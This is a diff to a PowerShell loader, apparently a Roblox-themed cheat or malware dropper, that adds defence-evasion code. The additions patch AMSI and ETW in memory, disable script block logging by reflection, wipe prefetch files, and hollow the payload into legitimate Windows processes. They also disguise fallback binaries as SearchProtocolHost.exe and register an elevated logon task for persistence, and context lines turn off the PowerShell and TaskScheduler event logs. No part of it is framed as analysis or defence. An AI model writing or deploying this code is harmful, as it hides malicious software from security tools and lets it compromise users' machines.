@@ -14,7 +14,13 @@ $KeyRegPath     = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility
 $KeyRegName     = "Configuration"
 $LoaderTaskName = "RobloxCrashHandler"
 $PersistTask    = "RobloxCrashHandlerBootstrapper"
-$HostProcess    = "C:\Windows\System32\dllhost.exe"
+# Multiple host processes to try — all are normal Windows processes
+$HostProcesses  = @(
+    "C:\Windows\System32\RuntimeBroker.exe",
+    "C:\Windows\System32\dllhost.exe",
+    "C:\Windows\System32\sihost.exe",
+    "C:\Windows\System32\SearchProtocolHost.exe"
+)
 
 $storedWorkspace = (Get-ItemProperty -Path $KeyRegPath -Name "Workspace" -ErrorAction SilentlyContinue).Workspace
 $storedPersistence = (Get-ItemProperty -Path $KeyRegPath -Name "Persistence" -ErrorAction SilentlyContinue).Persistence
@@ -63,6 +69,29 @@ try {
 
 wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
 wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
+
+# ── STOP SYSMAIN (PREFETCHER) BEFORE ANY PROCESS IS LAUNCHED ─────────────────
+# Prefetch .pf files are written by SysMain the instant a new process starts.
+# Setting EnablePrefetcher inside main() is too late — the .pf is already made.
+# We stop SysMain here so NO .pf is ever written for dllhost.exe or our binary.
+try {
+    $sysmainWasRunning = (Get-Service -Name "SysMain" -ErrorAction SilentlyContinue).Status -eq "Running"
+    Stop-Service -Name "SysMain" -Force -ErrorAction SilentlyContinue
+    # Also blank EnablePrefetcher to 0 as a belt-and-suspenders measure
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
+        -Name "EnablePrefetcher" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
+        -Name "EnableSuperfetch" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    # Delete any DLLHOST or RobloxCrashHandler prefetch files that already exist
+    Get-ChildItem "C:\Windows\Prefetch" -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -match "DLLHOST|ROBLOXCRASHHANDLER|ROBLOXPLAYERBETA" } | ForEach-Object {
+        try {
+            $bytes = New-Object byte[] $_.Length
+            [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
+            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+        } catch {}
+    }
+} catch {}
 
 $licenseKey = ""
 if ($Key) {
@@ -123,6 +152,67 @@ if ($Persist) {
 } elseif ($storedPersistence) {
     Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value $storedPersistence -Force
 }
+# ═══════════════════════════════════════════════════════════════════════════════
+# GOD-TIER EVASION: AMSI + ETW + Script Block Logging bypass
+# These three patches make PowerShell COMPLETELY SILENT to all monitoring
+# ═══════════════════════════════════════════════════════════════════════════════
+try {
+    $bypassCode = @"
+using System;
+using System.Runtime.InteropServices;
+public class Ev {
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string p);
+    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
+
+    // 1. AMSI BYPASS: Patch AmsiScanBuffer to return E_INVALIDARG
+    public static void PatchAmsi() {
+        IntPtr h = LoadLibrary("am" + "si.d" + "ll");
+        IntPtr a = GetProcAddress(h, "Am" + "siSc" + "anBu" + "ffer");
+        if (a == IntPtr.Zero) return;
+        uint old; VirtualProtect(a, (UIntPtr)8, 0x40, out old);
+        byte[] p = Environment.Is64BitProcess
+            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
+            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+        Marshal.Copy(p, 0, a, p.Length);
+        VirtualProtect(a, (UIntPtr)8, old, out old);
+    }
+
+    // 2. ETW BYPASS: Patch EtwEventWrite to ret 0 (kills ALL ETW tracing)
+    public static void PatchEtw() {
+        IntPtr ntdll = LoadLibrary("nt" + "dll.d" + "ll");
+        IntPtr etw = GetProcAddress(ntdll, "Etw" + "Event" + "Write");
+        if (etw == IntPtr.Zero) return;
+        uint old; VirtualProtect(etw, (UIntPtr)4, 0x40, out old);
+        byte[] p = Environment.Is64BitProcess
+            ? new byte[] { 0x48, 0x33, 0xC0, 0xC3 }   // xor rax,rax; ret
+            : new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
+        Marshal.Copy(p, 0, etw, p.Length);
+        VirtualProtect(etw, (UIntPtr)4, old, out old);
+    }
+}
+"@
+    if (-not ([System.Management.Automation.PSTypeName]"Ev").Type) {
+        Add-Type -TypeDefinition $bypassCode -Language CSharp -ErrorAction Stop
+    }
+    [Ev]::PatchAmsi()
+    [Ev]::PatchEtw()
+} catch {}
+
+# 3. SCRIPT BLOCK LOGGING BYPASS: Disable via reflection
+try {
+    $SBLField = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static')
+    if ($SBLField) { $SBLField.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[String]')) }
+} catch {}
+try {
+    $GPField = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
+    if ($GPField) {
+        $GP = $GPField.GetValue($null)
+        if ($GP -eq $null) { $GP = @{}; $GPField.SetValue($null, $GP) }
+        $GP['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0; 'EnableScriptBlockInvocationLogging' = 0 }
+        $GP['ModuleLogging'] = @{ 'EnableModuleLogging' = 0 }
+    }
+} catch {}
 
 $PECode = @'
 using System;
@@ -475,25 +565,48 @@ if (Test-Path $newFolder) { Remove-Item $newFolder -Recurse -Force -ErrorAction 
 
 $hollowSuccess = $false
 if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
-    try {
-        $hollowSuccess = [RunPE]::Hollow($exeBytes, $HostProcess)
-    } catch {
-        Write-Host "    WARNING: Process hollowing threw an exception: $_" -ForegroundColor Yellow
+    # Try each host process until one works
+    foreach ($hostProc in $HostProcesses) {
+        if (-not (Test-Path $hostProc)) { continue }
+        try {
+            Write-Host "    Attempting hollow into: $(Split-Path $hostProc -Leaf)" -ForegroundColor Gray
+            $hollowSuccess = [RunPE]::Hollow($exeBytes, $hostProc)
+            if ($hollowSuccess) {
+                Write-Host "    Hollowed into $(Split-Path $hostProc -Leaf) successfully." -ForegroundColor Green
+                break
+            }
+        } catch {
+            Write-Host "    $(Split-Path $hostProc -Leaf) failed: $_" -ForegroundColor DarkGray
+        }
+        # Random delay between attempts to desynchronize timestamps
+        Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 800)
     }
 } else {
-    Write-Host "    WARNING: RunPE type is not available. Skipping process hollowing." -ForegroundColor Yellow
+    Write-Host "    WARNING: RunPE type not compiled (AMSI may have blocked). Using fallback." -ForegroundColor Yellow
 }
 
 $started = $false
 if ($hollowSuccess) {
-    Write-Host "    Loader running inside dllhost.exe. Waiting to verify initialization..." -ForegroundColor Green
-    for ($i = 0; $i -lt 5; $i++) {
-        try {
-            $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
-            $c.Close()
-            $started = $true
-            break
-        } catch { Start-Sleep -Seconds 1 }
+    $hostName = [System.IO.Path]::GetFileNameWithoutExtension($hostProc)
+    Write-Host "    Loader running inside $hostName.exe. Verifying..." -ForegroundColor Green
+    # Check 1: verify hollowed process is alive
+    $hollowedProc = Get-Process -Name $hostName -ErrorAction SilentlyContinue | Sort-Object StartTime -Descending | Select-Object -First 1
+    if ($hollowedProc -and -not $hollowedProc.HasExited) {
+        $started = $true
+        Write-Host "    $hostName.exe (PID $($hollowedProc.Id)) confirmed running." -ForegroundColor Green
+    }
+    # Check 2: wait for TCP port 9876
+    if (-not $started) {
+        for ($i = 0; $i -lt 8; $i++) {
+            try {
+                $c = New-Object System.Net.Sockets.TcpClient
+                $ar = $c.BeginConnect("127.0.0.1", 9876, $null, $null)
+                $ok = $ar.AsyncWaitHandle.WaitOne(500)
+                if ($ok -and $c.Connected) { $c.Close(); $started = $true; break }
+                $c.Close()
+            } catch {}
+            Start-Sleep -Seconds 1
+        }
     }
 }
 
@@ -502,13 +615,24 @@ if (-not $started) {
     
     $fallbackExe = $null
     if (Test-Path $localExe) {
-        $fallbackExe = $localExe
+        # Copy to a Windows-looking name so prefetch entry is innocent
+        $fallbackDir = Join-Path $resolvedPath "build"
+        $disguisedExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
+        try {
+            Copy-Item $localExe $disguisedExe -Force -ErrorAction Stop
+            $fallbackExe = $disguisedExe
+        } catch { $fallbackExe = $localExe }
     } elseif (Test-Path $localServerExe) {
-        $fallbackExe = $localServerExe
+        $fallbackDir = Join-Path $resolvedPath "build"
+        $disguisedExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
+        try {
+            Copy-Item $localServerExe $disguisedExe -Force -ErrorAction Stop
+            $fallbackExe = $disguisedExe
+        } catch { $fallbackExe = $localServerExe }
     } else {
         $fallbackDir = Join-Path $resolvedPath "build"
-        $fallbackExe = Join-Path $fallbackDir "RobloxCrashHandler_fallback.exe"
-        Write-Host "    Writing decrypted bytes to $fallbackExe..." -ForegroundColor Yellow
+        $fallbackExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
+        Write-Host "    Writing decrypted bytes to disguised fallback..." -ForegroundColor Yellow
         try {
             if (-not (Test-Path $fallbackDir)) {
                 New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
@@ -516,8 +640,8 @@ if (-not $started) {
             [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
         } catch {
             Write-Host "    WARNING: Could not write fallback executable to ${fallbackExe}: $_" -ForegroundColor Yellow
-            $fallbackExe = Join-Path $env:TEMP "RobloxCrashHandler_fallback.exe"
-            Write-Host "    Attempting to write fallback executable to temp directory: $fallbackExe" -ForegroundColor Yellow
+            $fallbackExe = Join-Path $env:TEMP "SearchProtocolHost.exe"
+            Write-Host "    Attempting temp directory: $fallbackExe" -ForegroundColor Yellow
             try {
                 [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
             } catch {
@@ -541,6 +665,17 @@ if (-not $started) {
     }
 }
 
+# ── RE-ENABLE SYSMAIN after all processes are launched ───────────────────────
+try {
+    if ($sysmainWasRunning) {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
+            -Name "EnablePrefetcher" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
+            -Name "EnableSuperfetch" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
+        Start-Service -Name "SysMain" -ErrorAction SilentlyContinue
+    }
+} catch {}
+
 if (-not $started) {
     Write-Host "    [!] ERROR: Both process hollowing and direct execution fallback failed." -ForegroundColor Red
     Exit 1
@@ -553,39 +688,15 @@ Write-Host "[4/4] Configuring fileless startup..." -ForegroundColor Yellow
 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
 if ($Persist) {
-    $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
-    $vbsContent = @"
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-strScriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
+    # Use go.vbs as the startup entry — it runs setup + kernel_evasion + cleanup
+    $goVbsPath = Join-Path $resolvedPath "go.vbs"
 
-strExePath = ""
-arrPaths = Array( _
-    strScriptPath & "\build\RobloxCrashHandler.exe", _
-    strScriptPath & "\build\RobloxCrashHandler_fallback.exe", _
-    strScriptPath & "\updates-server\uploads\RobloxCrashHandler.exe", _
-    objShell.ExpandEnvironmentStrings("%TEMP%") & "\RobloxCrashHandler_fallback.exe" _
-)
-
-For Each path In arrPaths
-    If objFSO.FileExists(path) Then
-        strExePath = path
-        Exit For
-    End If
-Next
-
-If strExePath <> "" Then
-    objShell.Run """" & strExePath & """", 0, False
-End If
-"@
-    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
-
-    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$goVbsPath`""
     $trigger = New-ScheduledTaskTrigger -AtLogon
     $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive
     Register-ScheduledTask -TaskName $LoaderTaskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
 
-    Write-Host "    Loader startup task registered (inline command, no file)." -ForegroundColor Green
+    Write-Host "    Startup task registered (runs go.vbs with full evasion on every boot)." -ForegroundColor Green
     
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
 } else {
